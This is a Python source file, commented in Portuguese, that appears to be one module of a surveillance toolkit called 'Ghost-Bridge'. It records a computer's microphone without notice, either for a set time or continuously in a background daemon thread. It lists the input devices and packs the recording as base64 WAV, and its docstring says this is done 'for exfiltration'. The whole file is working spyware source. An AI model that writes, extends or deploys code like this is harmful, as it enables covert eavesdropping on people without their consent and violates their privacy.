"""
Ghost-Bridge - Audio Recording Module
Gravação silenciosa de áudio do microfone.
"""
import base64
import io
import time
import threading
import wave
from datetime import datetime

try:
    import pyaudio
    PYAUDIO_AVAILABLE = True
except ImportError:
    PYAUDIO_AVAILABLE = False


class AudioRecorder:
    """
    Gravação silenciosa de áudio.
    
    Features:
    - Gravação do microfone
    - Múltiplos dispositivos
    - Compressão para exfiltração
    - Gravação por duração ou contínua
    """
    
    # Configurações padrão
    CHUNK = 1024
    FORMAT = pyaudio.paInt16 if PYAUDIO_AVAILABLE else None
    CHANNELS = 1
    RATE = 16000  # 16kHz (suficiente para voz)
    
    def __init__(self, device_index=None):
        """
        Args:
            device_index: Índice do dispositivo (None = padrão)
        """
        if not PYAUDIO_AVAILABLE:
            raise ImportError("[!] pyaudio não instalado. Execute: pip install pyaudio")
        
        self.device_index = device_index
        self.audio = pyaudio.PyAudio()
        self.recording = False
        self.frames = []
    
    def list_devices(self):
        """Lista dispositivos de áudio disponíveis."""
        devices = []
        
        for i in range(self.audio.get_device_count()):
            info = self.audio.get_device_info_by_index(i)
            
            if info['maxInputChannels'] > 0:  # Apenas dispositivos de entrada
                devices.append({
                    'index': i,
                    'name': info['name'],
                    'channels': info['maxInputChannels'],
                    'sample_rate': int(info['defaultSampleRate'])
                })
        
        return devices
    
    def record(self, duration=10):
        """
        Grava áudio por uma duração específica.
        
        Args:
            duration: Duração em segundos
            
        Returns:
            Dict com áudio em base64 (WAV)
        """
        frames = []
        
        try:
            stream = self.audio.open(
                format=self.FORMAT,
                channels=self.CHANNELS,
                rate=self.RATE,
                input=True,
                input_device_index=self.device_index,
                frames_per_buffer=self.CHUNK
            )
            
            total_frames = int(self.RATE / self.CHUNK * duration)
            
            for _ in range(total_frames):
                data = stream.read(self.CHUNK, exception_on_overflow=False)
                frames.append(data)
            
            stream.stop_stream()
            stream.close()
            
        except Exception as e:
            return {'error': str(e)}
        
        # Converte para WAV em memória
        buffer = io.BytesIO()
        
        with wave.open(buffer, 'wb') as wf:
            wf.setnchannels(self.CHANNELS)
            wf.setsampwidth(self.audio.get_sample_size(self.FORMAT))
            wf.setframerate(self.RATE)
            wf.writeframes(b''.join(frames))
        
        audio_data = buffer.getvalue()
        
        return {
            'timestamp': datetime.now().isoformat(),
            'duration_seconds': duration,
            'sample_rate': self.RATE,
            'size_kb': len(audio_data) // 1024,
            'format': 'wav',
            'data': base64.b64encode(audio_data).decode('utf-8')
        }
    
    def start_continuous(self, max_duration=60):
        """
        Inicia gravação contínua em background.
        
        Args:
            max_duration: Duração máxima em segundos
        """
        self.recording = True
        self.frames = []
        
        def record_loop():
            try:
                stream = self.audio.open(
                    format=self.FORMAT,
                    channels=self.CHANNELS,
                    rate=self.RATE,
                    input=True,
                    input_device_index=self.device_index,
                    frames_per_buffer=self.CHUNK
                )
                
                start_time = time.time()
                
                while self.recording and (time.time() - start_time) < max_duration:
                    data = stream.read(self.CHUNK, exception_on_overflow=False)
                    self.frames.append(data)
                
                stream.stop_stream()
                stream.close()
                
            except:
                pass
            finally:
                self.recording = False
        
        thread = threading.Thread(target=record_loop, daemon=True)
        thread.start()
        
        return {'status': 'recording', 'max_duration': max_duration}
    
    def stop_continuous(self):
        """Para gravação contínua e retorna áudio."""
        self.recording = False
        time.sleep(0.5)  # Aguarda finalização
        
        if not self.frames:
            return {'error': 'Nenhum áudio capturado'}
        
        # Converte para WAV
        buffer = io.BytesIO()
        
        with wave.open(buffer, 'wb') as wf:
            wf.setnchannels(self.CHANNELS)
            wf.setsampwidth(self.audio.get_sample_size(self.FORMAT))
            wf.setframerate(self.RATE)
            wf.writeframes(b''.join(self.frames))
        
        audio_data = buffer.getvalue()
        duration = len(self.frames) * self.CHUNK / self.RATE
        
        return {
            'timestamp': datetime.now().isoformat(),
            'duration_seconds': round(duration, 2),
            'size_kb': len(audio_data) // 1024,
            'format': 'wav',
            'data': base64.b64encode(audio_data).decode('utf-8')
        }
    
    def __del__(self):
        """Cleanup."""
        try:
            self.audio.terminate()
        except:
            pass


# Teste standalone
if __name__ == "__main__":
    print("[*] Teste de Gravação de Áudio")
    
    if not PYAUDIO_AVAILABLE:
        print("[!] PyAudio não instalado")
        exit()
    
    recorder = AudioRecorder()
    
    print("[+] Dispositivos de entrada:")
    for dev in recorder.list_devices():
        print(f"    [{dev['index']}] {dev['name']}")
    
    print("\n[+] Gravando 5 segundos...")
    result = recorder.record(duration=5)
    
    if 'error' not in result:
        print(f"    Gravado: {result['duration_seconds']}s, {result['size_kb']} KB")
        
        # Salva para teste
        with open("test_audio.wav", "wb") as f:
            f.write(base64.b64decode(result['data']))
        print("    Salvo como test_audio.wav")
    else:
        print(f"    Erro: {result['error']}")
